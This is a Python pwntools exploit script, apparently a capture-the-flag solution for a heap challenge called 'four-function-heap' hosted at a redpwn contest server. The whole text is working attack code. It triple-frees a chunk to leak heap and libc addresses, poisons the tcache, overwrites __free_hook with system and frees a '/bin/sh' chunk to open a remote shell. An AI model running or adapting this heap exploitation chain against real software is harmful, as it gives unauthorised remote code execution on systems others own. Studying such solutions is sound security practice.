from pwn import *

IP = "2020.redpwnc.tf"
PORT = 31774

bin = ELF('bin/four-function-heap')
libc = ELF('./libc-2.27.so')
p = remote(IP, PORT)

def wait():
 p.recvrepeat(0.3)

def alloc(size, data='A'):
 wait()
 p.sendline('1')
 wait()
 p.sendline('0')
 wait()
 p.sendline(str(size))
 wait()
 p.sendline(data)

def free():
 wait()
 p.sendline('2')
 wait()
 p.sendline('0')

def show():
 wait()
 p.sendline('3')
 wait()
 p.sendline('0')

size1 = 0x200
size2 = 0x90

alloc(size1)
for i in range(3):
 free()
show()
heapleak = u64(p.recv(6).ljust(8, '\x00'))
heapbase = heapleak - 0x260
log.info("Heap leak: " + hex(heapleak))
alloc(size1, p64(heapbase+0x10))
alloc(size1, p64(heapleak)*0x30)
alloc(size1, p64(0) + p64(0x0000000000000007) + p64(0) * 2 + p64(0x0000000007000000) + p64(0) * 11 + p64(heapleak)*2)
free()
show()
libcleak = u64(p.recv(6).ljust(8, '\x00'))
libc.address = libcleak - 0x3ebca0
log.info("Libc base: " + hex(libc.address))
alloc(size2, p64(libc.symbols['__free_hook'] - 8))
alloc(size2)
alloc(size2, '/bin/sh\x00' + p64(libc.symbols['system']))
free()
p.interactive()

